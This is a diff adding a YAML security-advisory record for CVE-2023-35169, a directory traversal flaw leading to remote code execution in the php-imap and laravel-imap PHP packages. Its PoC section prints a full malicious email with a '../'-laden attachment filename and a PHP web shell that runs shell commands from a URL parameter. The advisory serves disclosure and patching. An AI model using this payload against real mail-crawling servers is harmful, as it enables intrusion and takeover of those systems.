@@ -1,0 +1,237 @@
+advisory_id: GHSA-47p7-xfcc-4pv9
+datasource_id: github_osv/GHSA-47p7-xfcc-4pv9
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/06/GHSA-47p7-xfcc-4pv9/GHSA-47p7-xfcc-4pv9.json
+aliases:
+  - CVE-2023-35169
+summary: |
+  php-imap vulnerable to RCE through a directory traversal vulnerability
+  ### Summary
+  An unsanitized attachment filename allows any unauthenticated user to leverage a directory traversal vulnerability which results in a remote code execution vulnerability.
+
+  ### Details
+  An attacker can send an email with a malicious attachment to the inbox, which gets crawled with webklex/php-imap or webklex/laravel-imap. Prerequisite for the vulnerability is that the script stores the attachments without providing a `$filename`, or providing an unsanitized `$filename`, in `src/Attachment::save(string $path, string $filename = null)` (https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255).
+  In this case, where no `$filename` gets passed into the `Attachment::save()` method, the package would use a series of unsanitized and insecure input values from the mail as fallback (https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252).
+  Even if a developer passes a `$filename` into the `Attachment::save()` method, e.g. by passing the name or filename of the mail attachment itself (from email headers), the input values never get sanitized by the package.
+  There is also no restriction about the file extension (e.g. ".php") or the contents of a file. This allows an attacker to upload malicious code of any type and content at any location where the underlying user has write permissions.
+  The attacker can also overwrite existing files and inject malicious code into files that, e.g. get executed by the system via cron, requests,...
+  The official documentation only shows examples of `Attachment::save()` without providing the `$filename` (https://www.php-imap.com/api/attachment), which makes this vulnerability even more widespread.
+
+  ### PoC
+  1. send an email with a malicious attachment to an inbox, which gets crawled by the package
+  ```
+  Return-Path: <attacker@example.com>
+  Date: Fri, 17 Aug 2018 14:36:24 +0000
+  From: Attacker <attacker@example.com>
+  To: Victim <victim@example.com>
+  MIME-Version: 1.0
+  Content-Type: multipart/mixed;
+   boundary="_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_"
+
+  Mail with malicious attachment
+
+  --_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_
+  Content-Type: application/octet-stream; name=shell.php
+  Content-Transfer-Encoding: 8bit
+  Content-Disposition: attachment; filename=../../../../../../../../../../../../var/www/shell.php
+
+  <?php
+  // RCE
+  system($_GET['cmd'] ?? '#');
+  ?>
+
+  --_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_--
+
+
+  ```
+  3. crawl email with malicious attachment
+  4. store the attachment with `Attachment::save('/path/to/storage')` without providing a `$filename` value
+
+  ### Impact
+  This is a remote code execution vulnerability that is made possible through a directory traversal vulnerability.
+  Every application that stores attachments with `Attachment::save()` without providing a `$filename` or passing unsanitized user input is affected by this attack.
+impacted_packages:
+  - purl: pkg:composer/webklex/php-imap
+    affected_versions: vers:composer/<5.3.0
+    fixed_versions: vers:composer/5.3.0
+    affected_packages:
+      - pkg:composer/webklex/php-imap@0.0.1
+      - pkg:composer/webklex/php-imap@0.0.2
+      - pkg:composer/webklex/php-imap@0.0.3
+      - pkg:composer/webklex/php-imap@1.4.2
+      - pkg:composer/webklex/php-imap@1.4.2%2B1
+      - pkg:composer/webklex/php-imap@1.4.5
+      - pkg:composer/webklex/php-imap@2.0.0
+      - pkg:composer/webklex/php-imap@2.0.1
+      - pkg:composer/webklex/php-imap@2.1.0
+      - pkg:composer/webklex/php-imap@2.1.1
+      - pkg:composer/webklex/php-imap@2.1.2
+      - pkg:composer/webklex/php-imap@2.1.3
+      - pkg:composer/webklex/php-imap@2.1.4
+      - pkg:composer/webklex/php-imap@2.1.5
+      - pkg:composer/webklex/php-imap@2.1.6
+      - pkg:composer/webklex/php-imap@2.1.7
+      - pkg:composer/webklex/php-imap@2.1.8
+      - pkg:composer/webklex/php-imap@2.1.9
+      - pkg:composer/webklex/php-imap@2.1.10
+      - pkg:composer/webklex/php-imap@2.1.11
+      - pkg:composer/webklex/php-imap@2.1.12
+      - pkg:composer/webklex/php-imap@2.1.13
+      - pkg:composer/webklex/php-imap@2.2.0
+      - pkg:composer/webklex/php-imap@2.2.1
+      - pkg:composer/webklex/php-imap@2.2.2
+      - pkg:composer/webklex/php-imap@2.2.3
+      - pkg:composer/webklex/php-imap@2.2.4
+      - pkg:composer/webklex/php-imap@2.2.5
+      - pkg:composer/webklex/php-imap@2.3.0
+      - pkg:composer/webklex/php-imap@2.3.1
+      - pkg:composer/webklex/php-imap@2.4.0
+      - pkg:composer/webklex/php-imap@2.4.1
+      - pkg:composer/webklex/php-imap@2.4.2
+      - pkg:composer/webklex/php-imap@2.4.3
+      - pkg:composer/webklex/php-imap@2.4.4
+      - pkg:composer/webklex/php-imap@2.5.0
+      - pkg:composer/webklex/php-imap@2.5.1
+      - pkg:composer/webklex/php-imap@2.6.0
+      - pkg:composer/webklex/php-imap@2.7.0
+      - pkg:composer/webklex/php-imap@2.7.1
+      - pkg:composer/webklex/php-imap@2.7.2
+      - pkg:composer/webklex/php-imap@3.0.0-alpha
+      - pkg:composer/webklex/php-imap@3.1.0-alpha
+      - pkg:composer/webklex/php-imap@3.2.0
+      - pkg:composer/webklex/php-imap@4.0.0
+      - pkg:composer/webklex/php-imap@4.0.1
+      - pkg:composer/webklex/php-imap@4.0.2
+      - pkg:composer/webklex/php-imap@4.1.0
+      - pkg:composer/webklex/php-imap@4.1.1
+      - pkg:composer/webklex/php-imap@4.1.2
+      - pkg:composer/webklex/php-imap@5.0.0
+      - pkg:composer/webklex/php-imap@5.0.1
+      - pkg:composer/webklex/php-imap@5.1.0
+      - pkg:composer/webklex/php-imap@5.2.0
+    fixed_packages:
+      - pkg:composer/webklex/php-imap@5.3.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:composer/webklex/laravel-imap
+    affected_versions: vers:composer/<5.3.0
+    fixed_versions: vers:composer/5.3.0
+    affected_packages:
+      - pkg:composer/webklex/laravel-imap@1.0.0
+      - pkg:composer/webklex/laravel-imap@1.0.1
+      - pkg:composer/webklex/laravel-imap@1.0.2
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B10
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B11
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B12
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B2
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B3
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B4
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B5
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B6
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B7
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B8
+      - pkg:composer/webklex/laravel-imap@1.0.2%2B9
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B0
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B1
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B10
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B11
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B2
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B3
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B4
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B5
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B6
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B7
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B8
+      - pkg:composer/webklex/laravel-imap@1.0.3%2B9
+      - pkg:composer/webklex/laravel-imap@1.0.4%2B0
+      - pkg:composer/webklex/laravel-imap@1.0.4%2B1
+      - pkg:composer/webklex/laravel-imap@1.0.4%2B2
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B0
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B1
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B2
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B3
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B4
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B5
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B6
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B7
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B8
+      - pkg:composer/webklex/laravel-imap@1.0.5%2B9
+      - pkg:composer/webklex/laravel-imap@1.1.0
+      - pkg:composer/webklex/laravel-imap@1.1.1
+      - pkg:composer/webklex/laravel-imap@1.1.2
+      - pkg:composer/webklex/laravel-imap@1.2.0
+      - pkg:composer/webklex/laravel-imap@1.2.1
+      - pkg:composer/webklex/laravel-imap@1.2.2
+      - pkg:composer/webklex/laravel-imap@1.2.3
+      - pkg:composer/webklex/laravel-imap@1.2.4
+      - pkg:composer/webklex/laravel-imap@1.2.5
+      - pkg:composer/webklex/laravel-imap@1.2.6
+      - pkg:composer/webklex/laravel-imap@1.2.7
+      - pkg:composer/webklex/laravel-imap@1.2.8
+      - pkg:composer/webklex/laravel-imap@1.2.9
+      - pkg:composer/webklex/laravel-imap@1.3.0
+      - pkg:composer/webklex/laravel-imap@1.3.1
+      - pkg:composer/webklex/laravel-imap@1.4.0
+      - pkg:composer/webklex/laravel-imap@1.4.1
+      - pkg:composer/webklex/laravel-imap@1.4.2
+      - pkg:composer/webklex/laravel-imap@1.4.3
+      - pkg:composer/webklex/laravel-imap@1.4.4
+      - pkg:composer/webklex/laravel-imap@1.4.5
+      - pkg:composer/webklex/laravel-imap@1.5.0
+      - pkg:composer/webklex/laravel-imap@1.5.1
+      - pkg:composer/webklex/laravel-imap@1.5.2
+      - pkg:composer/webklex/laravel-imap@1.5.3
+      - pkg:composer/webklex/laravel-imap@1.6.0
+      - pkg:composer/webklex/laravel-imap@1.6.1
+      - pkg:composer/webklex/laravel-imap@1.6.2
+      - pkg:composer/webklex/laravel-imap@2.0.0
+      - pkg:composer/webklex/laravel-imap@2.0.1
+      - pkg:composer/webklex/laravel-imap@2.0.2
+      - pkg:composer/webklex/laravel-imap@2.1.0
+      - pkg:composer/webklex/laravel-imap@2.1.1
+      - pkg:composer/webklex/laravel-imap@2.2.0
+      - pkg:composer/webklex/laravel-imap@2.3.0
+      - pkg:composer/webklex/laravel-imap@2.4.0
+      - pkg:composer/webklex/laravel-imap@3.0.0-alpha
+      - pkg:composer/webklex/laravel-imap@4.0.0
+      - pkg:composer/webklex/laravel-imap@4.1.2
+      - pkg:composer/webklex/laravel-imap@5.2.0
+    fixed_packages:
+      - pkg:composer/webklex/laravel-imap@5.3.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/06/GHSA-47p7-xfcc-4pv9/GHSA-47p7-xfcc-4pv9.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/Webklex/php-imap
+    reference_type:
+    reference_id:
+  - url: https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255
+    reference_type:
+    reference_id:
+  - url: https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252
+    reference_type:
+    reference_id:
+  - url: https://github.com/Webklex/php-imap/pull/414
+    reference_type:
+    reference_id:
+  - url: https://github.com/Webklex/php-imap/releases/tag/5.3.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-35169
+    reference_type:
+    reference_id: CVE-2023-35169
+  - url: https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9
+    reference_type:
+    reference_id: GHSA-47p7-xfcc-4pv9
+exploits: []
